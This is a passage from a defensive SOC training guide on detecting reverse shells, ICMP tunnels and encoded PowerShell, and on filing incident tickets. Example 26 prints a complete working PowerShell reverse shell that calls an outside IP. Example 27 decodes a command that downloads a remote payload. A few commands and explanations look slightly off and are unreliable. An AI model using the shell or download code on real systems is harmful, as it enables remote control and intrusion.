logs are unavailable (network devices, IoT, legacy systems) or where log integrity is in question
after a compromise. Analysts who can navigate a PCAP from the command line without depending on a
GUI can work in headless environments, scripted pipelines, and situations where only SSH access
to a network sensor is available.

---

## Example 24: Identifying a Reverse Shell in Network Logs — Outbound Connection on Unusual Port

**What this covers:** A reverse shell is a technique where the compromised host initiates an
outbound connection to the attacker, bypassing inbound firewall rules. In network logs and PCAP
data, reverse shells appear as persistent outbound TCP connections to unusual ports (not 80/443)
on non-corporate IPs, often with small regular packet sizes consistent with interactive shell
sessions.

**Scenario:** Your SIEM fires an alert for a persistent outbound TCP connection from an internal
server to an external IP on port 4444 — a port associated with Metasploit's default listener.

```bash
# Firewall flow log — reverse shell detection
# Format: TIMESTAMP SRC_IP:PORT -> DST_IP:PORT PROTO STATE BYTES_SENT BYTES_RECV DURATION

2026-05-21T16:42:00Z 10.x.1.25:51200 -> 203.0.113.200:4444 TCP ESTABLISHED 1240 8920 00:03:12
# => Internal host 10.x.1.25 initiated outbound connection to external 203.0.113.200:4444
# => Port 4444: Metasploit meterpreter/reverse_tcp default listener port
# => Duration 00:03:12 (3 minutes 12 seconds) — persistent, not a one-shot HTTP request
# => BYTES_SENT 1240, BYTES_RECV 8920 — server received more than it sent (typical for interactive shell)
#    (attacker issues commands = small outbound; command output = large inbound)

2026-05-21T16:45:15Z 10.x.1.25:51202 -> 203.0.113.200:4444 TCP ESTABLISHED 890 12440 00:02:47
# => Second connection from same host to same external IP and port
# => Reconnection pattern: reverse shell reconnected after temporary drop (C2 resilience)
# => Two sessions in 5 minutes = active interactive control, not an automated beacon

# PCAP verification — tshark analysis of the suspected reverse shell traffic
tshark -r /evidence/incident_20260521.pcap \
  -Y "ip.dst == 203.0.113.200 and tcp.port == 4444" \
  -T fields -e frame.time -e tcp.len -e tcp.flags.str \
  2>/dev/null | head 20
# => tcp.len: payload length per packet
# => Patterns to look for in a reverse shell:
#    - Small regular outbound packets (keystrokes: 1-20 bytes each)
#    - Larger inbound packets (command output returned to attacker)
#    - ACK flags between data packets (interactive session pattern)

# Endpoint verification — check what process owns the connection on the host
# (Run on 10.x.1.25 if accessible)
ss -tnp | grep 4444
# => tcp  ESTAB  0  0  10.x.1.25:51202  203.0.113.200:4444  users:(("python3",pid=3142,fd=3))
# => Process "python3" owns this connection (PID 3142)
# => Python reverse shell is extremely common: python3 -c 'import socket...' one-liner
# => Immediately correlate PID 3142 with /proc/3142/cmdline to confirm and preserve evidence
```

**Key Takeaway:** Outbound connections on ports like 4444, 1234, 9001, or 31337 with
bidirectional payload patterns (small outbound, larger inbound) and long duration are
reverse-shell signatures — isolate the host immediately and preserve a memory dump before
killing the process.

**Why It Matters:** Reverse shells are the most common post-exploitation persistence technique
for attackers who have achieved initial code execution. Because they use outbound connections,
traditional inbound-blocking firewalls do not stop them. Network flow data and endpoint process
correlation are often the only detection mechanisms available. Analysts who can recognize reverse
shell network patterns can trigger host isolation before the attacker achieves further lateral
movement.

---

## Example 25: Detecting ICMP Tunneling — Large or Unusual ICMP Payload Analysis

**What this covers:** ICMP tunneling encodes data (commands, stolen files, C2 traffic) inside
ICMP echo request/reply packets that pass through firewalls permitting ping. Legitimate ICMP echo
packets contain 32-56 bytes of data; tunneled traffic typically carries payloads of 500-1400 bytes
or uses non-standard ICMP types.

**Scenario:** Your anomaly detection rule fired for a host generating sustained ICMP traffic to
an external IP with payload sizes far above the 56-byte baseline.

```bash
# tshark analysis — ICMP tunnel detection
# Normal ICMP echo (ping) has 32 bytes payload on Windows, 56 bytes on Linux

# STEP 1: Measure ICMP payload sizes between internal host and external IP
tshark -r /evidence/incident_20260521.pcap \
  -Y "icmp and ip.src == 10.x.1.30 and ip.dst == 203.0.113.210" \
  -T fields -e frame.time -e icmp.type -e icmp.code -e data.len \
  2>/dev/null
# => icmp.type: 8 = echo request (ping), 0 = echo reply
# => data.len: payload size in bytes
# => Expected for normal ping: data.len = 32 or 56
# => ICMP tunnel indicator: data.len consistently 500-1400 bytes

# Sample output (fictional — ICMP tunnel):
# 16:50:01.000 8  0  1024   # => ICMP echo request with 1024 bytes payload (40x normal)
# 16:50:01.050 0  0   512   # => ICMP echo reply with 512 bytes (response data)
# 16:50:02.100 8  0  1024   # => Regular 1-second interval + large payload = tunnel beaconing
# 16:50:02.155 0  0   512   # => Consistent reply size suggests a protocol, not random data

# STEP 2: Extract ICMP payload content to inspect for structured data
tshark -r /evidence/incident_20260521.pcap \
  -Y "icmp.type == 8 and ip.src == 10.x.1.30" \
  -T fields -e data \
  2>/dev/null | head 5
# => -e data: raw hex payload of each ICMP packet
# => Look for: repeated byte patterns (headers), printable ASCII (commands), or base64 sequences

# Sample hex output (fictional):
# 494e4954202f62696e2f736800  # => hex decodes to "INIT /bin/sh\0" — icmptunnel tool command header
# => Structured header at start of ICMP payload confirms tunneling tool (e.g., icmptunnel, ptunnel)
printf '%s' "494e4954202f62696e2f736800" | xxd -r -p
# => Output: INIT /bin/sh   (confirms a shell being initialized over ICMP)

# STEP 3: Quantify the data volume — how much was exfiltrated?
tshark -r /evidence/incident_20260521.pcap \
  -Y "icmp and ip.src == 10.x.1.30 and ip.dst == 203.0.113.210" \
  -q -z "io,stat,60,BYTES,icmp"
# => -z "io,stat,60,...": show bytes per 60-second bucket
# => Total bytes across all ICMP packets = maximum exfiltration volume estimate
# => Normal host should generate ~0 ICMP bytes to external IPs (no reason to ping the Internet)
```

**Key Takeaway:** Any host generating sustained ICMP traffic to an external IP with payloads
consistently above 100 bytes is almost certainly running an ICMP tunneling tool — firewall all
ICMP to external IPs, isolate the host, and calculate total data volume for breach notification.

**Why It Matters:** ICMP tunneling is a covert channel technique used by sophisticated attackers
to exfiltrate data or maintain C2 communications past firewalls that permit ping. Many organizations
allow ICMP outbound without inspection, making it an effective low-detection path. Adding network
monitoring for anomalous ICMP payload sizes to your detection stack closes a common blind spot
that traditional port-based firewall rules miss entirely.

---

## Example 26: Reading Windows PowerShell Event Logs — Event ID 4103 and 4104

**What this covers:** Windows PowerShell script block logging (Event ID 4104) and module logging
(Event ID 4103) record the actual PowerShell code that executes, enabling analysts to inspect
commands even when they were passed encoded or obfuscated. These logs are the most important
endpoint forensics source for PowerShell-based attacks and live in the
`Microsoft-Windows-PowerShell/Operational` event log channel.

**Scenario:** You are investigating a compromised endpoint where endpoint detection flagged
PowerShell activity but the process command line was empty due to a logging gap.

```bash
# Windows PowerShell Event Logs — key fields in key:value form
# Log: Microsoft-Windows-PowerShell/Operational
# Access via: Get-WinEvent or Event Viewer → Applications and Services Logs → Windows PowerShell

# Event ID 4104 — Script Block Logging (captures the actual script text)

EventID:         4104
TimeCreated:     2026-05-21T14:22:15Z
Computer:        WKS-FIN-017.corp.example.com
Path:            C:\Users\bwilson\AppData\Local\Temp\updater.ps1
# => Path: the script file path if run from file (or "<No file>" for inline commands)
# => This path reveals the script was dropped to a world-writable temp location (suspicious)

ScriptBlockText: |
  $c = New-Object System.Net.Sockets.TCPClient("203.0.113.200", 4444)
  # => Creating a TCP client to the attacker's IP and port 4444 (reverse shell destination)
  $s = $c.GetStream()
  # => Get the network stream for bidirectional communication
  [byte[]]$b = 0..65535|%{0}
  # => Initialize a byte buffer for reading data from the stream
  while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object Text.UTF8Encoding).GetString($b, 0, $i)
    # => Decode received bytes as UTF-8 string (interpret incoming commands)
    $sb = (iex $d 2>&1 | Out-String)
    # => iex (Invoke-Expression): EXECUTE the received string as PowerShell code
    # => This is the core of the reverse shell: receive command → execute → return output
    $e = [System.Text.Encoding]::UTF8.GetBytes($sb)
    $s.Write($e, 0, $e.Length)
    # => Send command output back to attacker over the TCP stream
  }
# => This 8-line script is a complete PowerShell TCP reverse shell
# => Script block logging captured it verbatim — critical forensic evidence

# ---

# Event ID 4103 — Module Logging (captures parameter bindings for cmdlets)

EventID:         4103
TimeCreated:     2026-05-21T14:22:10Z
Payload:         CommandInvocation(Invoke-Expression): "Invoke-Expression"
                 ParameterBinding(Invoke-Expression): name="Command"; value="[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAHYAbwBrAGUA...'))"
# => Module log shows Invoke-Expression (iex) was called with a base64-encoded argument
# => This is the deobfuscation stage: base64 → decode → execute (common obfuscation chain)
# => The 4104 event shows the DECODED script; 4103 shows the encoded invocation that preceded it
# => Timeline: 4103 at 14:22:10 (encoded invoke) → 4104 at 14:22:15 (decoded script executed)
```

**Key Takeaway:** Event ID 4104 captures the decoded, deobfuscated script block that actually
ran — even if the process command line only shows `-EncodedCommand`, the script block log
reveals the true payload; treat any 4104 containing `Invoke-Expression` with a network socket
as a confirmed reverse shell.

**Why It Matters:** PowerShell is the dominant post-exploitation tool on Windows because it is
signed by Microsoft, whitelisted by most security tools, and capable of network access, credential
harvesting, and persistence without touching disk. Script block logging (4104) and module logging
(4103) are the most effective detections available because they capture what PowerShell actually
executed, not just what process was launched — making them resistant to argument obfuscation.

---

## Example 27: Detecting Encoded PowerShell Commands — Base64 Decode of Suspicious Command

**What this covers:** The `-EncodedCommand` flag in PowerShell accepts a base64-encoded UTF-16LE
string and executes it without the plain-text command appearing in process creation logs. Analysts
who can decode these payloads on the command line recover the actual malicious command without
needing to execute anything on the endpoint.

**Scenario:** Event ID 4688 (process creation) on a compromised host shows PowerShell launched
with `-EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwADMALgAwAC4AMQAxADMALgA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxAA==`.
You need to decode it without running it.

```bash
# BASE64 DECODE — recovering a PowerShell -EncodedCommand payload
# IMPORTANT: Never execute the decoded output — decode for analysis only

ENCODED="SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwADMALgAwAC4AMQAxADMALgA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxAA=="
# => The base64 string extracted from the 4688 event's CommandLine field

echo "${ENCODED}" | base64 -d | strings
# => base64 -d: decode the base64 payload
# => strings: extract printable ASCII/UTF-8 sequences from the binary output
# => PowerShell encodes commands as UTF-16LE (2 bytes per character), so raw decode looks binary
# => strings filters out null bytes and recovers readable text

# Output:
# => Invoke-WebRequest -Uri http://103.0.113.5/payload.ps1
# => The decoded command is a web download: Invoke-WebRequest (alias: iwr, wget, curl in PS)
# => URI http://103.0.113.5/payload.ps1 — downloads a secondary PowerShell payload from C2

# Alternative decode method — preserves UTF-16LE correctly
echo "${ENCODED}" | base64 -d | iconv -f UTF-16LE -t UTF-8 2>/dev/null
# => iconv converts the UTF-16LE encoding to UTF-8 for proper display
# => This method handles multi-byte characters that strings might split incorrectly
# => Produces: "Invoke-WebRequest -Uri http://103.0.113.5/payload.ps1"

# STEP 2: Analyze the decoded command for additional IOCs
DECODED_URL="http://103.0.113.5/payload.ps1"
# => IOC extracted: URL to secondary payload
# => Submit domain/IP to VirusTotal (Example 22) and AbuseIPDB (Example 20)

# STEP 3: Check if the download succeeded on the host
grep -r "payload.ps1" /var/log/proxy.log 2>/dev/null
# => If using a web proxy, search proxy logs for the download request
# => If found: the payload.ps1 was downloaded — escalate to full IR engagement
# => If not found: download may have been blocked by proxy or the host had no internet access

# STEP 4: Document the decoded payload in the incident ticket
# Decoded command: Invoke-WebRequest -Uri http://103.0.113.5/payload.ps1
# IOCs: IP 103.0.113.5, URL http://103.0.113.5/payload.ps1, filename payload.ps1
# => Add all three IOCs to the block list at the proxy, firewall, and email gateway
```

**Key Takeaway:** The two-step decode (base64 → iconv UTF-16LE → UTF-8) recovers the exact
PowerShell command that ran; the recovered URL is a primary IOC that allows you to block the
C2 download server and search proxy logs for other hosts that contacted it.

**Why It Matters:** `-EncodedCommand` obfuscation is one of the most commonly used anti-forensics
techniques in phishing-delivered malware because many SIEM parsers and analysts skip encoded
command lines as "unreadable." Analysts who can decode these payloads in under a minute recover
C2 infrastructure details, secondary payload hashes, and victim scope data that would otherwise
require hours of sandbox analysis or remain unknown.

---

## Example 28: Basic Incident Ticket Creation — Fields Required for a Security Incident Record

**What this covers:** Every confirmed or suspected security incident requires a formal ticket in
the incident management system (e.g., Jira, ServiceNow, PagerDuty) to ensure consistent handling,
regulatory compliance, and post-incident review. Knowing the required fields and how to populate
them quickly and accurately is a core Tier 1 SOC competency.

**Scenario:** You have completed triage on the SSH brute-force incident from Example 7 and the
confirmed PowerShell reverse shell from Examples 26-27. You need to create formal incident tickets
for both.

```bash
# INCIDENT TICKET TEMPLATE — required fields and populated examples
# Format: FIELD_NAME: VALUE   # => annotation explaining the field

# ===== TICKET 1: SSH Brute Force with Successful Login =====

INCIDENT_ID:         INC-2026-05-0421
# => Auto-generated by ticketing system; record this ID in all subsequent communications

TITLE:               SSH Brute Force with Credential Compromise — db-prod-01
# => Format: Attack Type + Outcome + Affected Asset
# => Concise, searchable, unambiguous — not "possible suspicious activity"

SEVERITY:            HIGH
# => Severity tiers: CRITICAL (active data theft/ransomware), HIGH (confirmed compromise),
# =>                 MEDIUM (strong indicator, no confirmed impact), LOW (anomaly, likely FP)
# => Successful login on a production DB host = HIGH

STATUS:              In Progress — Escalated to Tier 2
# => Valid statuses: New, In Progress, Escalated, Contained, Eradicated, Closed

DETECTED_AT:         2026-05-21T04:11:48Z
# => Timestamp when the malicious activity occurred (from auth.log — see Example 7)

REPORTED_AT:         2026-05-21T04:22:00Z
# => Timestamp when the SOC analyst opened the ticket (used to calculate MTTD)

AFFECTED_ASSETS:
  - db-prod-01.corp.example.com (10.x.1.5)
# => List all affected hostnames and IPs; include role (production DB server)

IOCs:
  - src_ip: 203.0.113.99         # => Attacker IP used for brute force
  - username: deploy              # => Compromised account
  - attack_start: 2026-05-21T04:11:00Z  # => First failure timestamp
  - attack_success: 2026-05-21T04:11:48Z  # => Successful login timestamp
# => IOCs are shared with threat intel team and added to block lists

EVIDENCE:
  - auth.log extract: /evidence/INC-2026-05-0421/auth.log.txt
  - SIEM alert ID: ALERT-20260521-0447
  - AbuseIPDB report: score 92/100 for 203.0.113.99
# => Preserve all evidence with chain of custody (copy, do not move)

MITRE_ATTACK:
  - T1110.001: Brute Force — Password Guessing
  - T1078: Valid Accounts (post-compromise use of deploy account)
# => ATT&CK mapping enables trend analysis and detection gap identification

ACTIONS_TAKEN:
  - 04:23: Disabled user account "deploy" in /etc/passwd
  - 04:25: Blocked 203.0.113.99 at perimeter firewall (rule FW-DENY-421)
  - 04:30: Escalated to Tier 2 (analyst: jsmith@corp.example.com)
  - 04:32: Opened remediation ticket TKT-2026-0892 for SSH firewall gap on db-prod-01
# => Timestamped action log forms the incident timeline — critical for post-incident review

RECOMMENDED_REMEDIATION:
  - Restrict SSH on db-prod-01 to internal network only (firewall rule update)
  - Disable password authentication for SSH; require key-based auth (sshd_config change)
  - Rotate all credentials for the "deploy" account and review its permissions
  - Enable fail2ban on all Internet-exposed Linux hosts
# => Remediation recommendations are separated from containment actions
# => Remediation may have a separate change management ticket with approval workflow

REPORTER:            soc-analyst-kwame@corp.example.com
ASSIGNED_TO:         tier2-lead-priya@corp.example.com
# => Clear ownership prevents alert falling through the cracks
```

**Key Takeaway:** A well-structured incident ticket is both an operational tool (coordinates the
response team) and a compliance artifact (demonstrates due diligence to auditors and regulators) —
invest the two minutes to complete every field accurately rather than writing a summary note.

**Why It Matters:** Incomplete incident tickets are one of the leading causes of prolonged incident
dwell time and failed regulatory audits. When an incident is escalated, handed off between shifts,
or reviewed during a post-incident analysis, the ticket is the primary information source. An
incident with a properly populated ticket — including all IOCs, affected assets, and timestamped
actions — can be handed to a new analyst mid-investigation without any verbal briefing, reducing
response friction and preventing repeated mistakes across the incident lifecycle.
